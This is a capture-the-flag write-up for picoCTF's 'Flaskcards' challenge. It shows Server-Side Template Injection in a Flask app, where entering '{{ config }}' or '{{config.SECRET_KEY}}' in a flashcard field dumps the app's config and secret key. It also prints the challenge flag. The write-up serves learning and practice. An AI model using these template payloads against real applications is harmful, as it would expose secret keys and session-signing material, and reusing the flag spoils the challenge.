# Flaskcards
We found this fishy [website](http://2018shell.picoctf.com:43165/) for flashcards that we think may be sending secrets. Could you take a look?


# Solution
The solution to this problem took me a while to figure out because I did not know about [Server-Side Template Injection](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee). I realized that the backend was using [Flask](https://flask.palletsprojects.com/) due to the hint in the name of this challenge, however I did not know about the potential of SSTI vulnerability when using Flask. After reading the blog post I attempted SSTI on the `Create Card` page and viewed the result in the `List Cards` page, and eventually I found the flag.

When using Flask, the following global variables are available within a Jinja2 template:

- config `{{ config }}`
- request `{{ request }}`
- the rest could be found here [https://flask.palletsprojects.com/en/1.1.x/templating/#standard-context](https://flask.palletsprojects.com/en/1.1.x/templating/#standard-context).

### Exploit
1. Create an account on [http://2018shell.picoctf.com:43165/register](http://2018shell.picoctf.com:43165/register)
2. Login
3. Navigate to [Create Card](http://2018shell.picoctf.com:43165/create_card)
4. Enter `config` for the username and `{{ config }}` for the answer. Click "Create".
5. Navigate to [List Cards](http://2018shell.picoctf.com:43165/list_cards)
6. Click on `Answer:` to reveal the config object.
7. Notice, the flag is `'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_8f40629c}'`.

```
<Config {'TRAP_HTTP_EXCEPTIONS': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'SERVER_NAME': None, 'TESTING': False, 'SESSION_COOKIE_PATH': None, 'SQLALCHEMY_RECORD_QUERIES': None, 'MAX_CONTENT_LENGTH': None, 'USE_X_SENDFILE': False, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'PREFERRED_URL_SCHEME': 'http', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'SQLALCHEMY_ECHO': False, 'SESSION_COOKIE_DOMAIN': False, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_BINDS': None, 'JSON_SORT_KEYS': True, 'BOOTSTRAP_USE_MINIFIED': True, 'SESSION_REFRESH_EACH_REQUEST': True, 'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_8f40629c}', 'SQLALCHEMY_POOL_SIZE': None, 'JSONIFY_MIMETYPE': 'application/json', 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'ENV': 'production', 'PROPAGATE_EXCEPTIONS': None, 'APPLICATION_ROOT': '/', 'DEBUG': False, 'SESSION_COOKIE_SECURE': False, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'BOOTSTRAP_SERVE_LOCAL': False, 'SQLALCHEMY_POOL_TIMEOUT': None, 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'JSON_AS_ASCII': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'SESSION_COOKIE_NAME': 'session', 'TRAP_BAD_REQUEST_ERRORS': None, 'SESSION_COOKIE_HTTPONLY': True, 'TEMPLATES_AUTO_RELOAD': None, 'EXPLAIN_TEMPLATE_LOADING': False}>
```

**Another way to get the flag is to create a card where the question is `config.SECRET_KEY` and the answer is `{{config.SECRET_KEY}}`. This will give us the flag, when we list the cards, without the other fields in the config object.**



### Hints
- Are there any common vulnerabilities with the backend of the website?
- Is there anywhere that filtering doesn't get applied?
- The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user

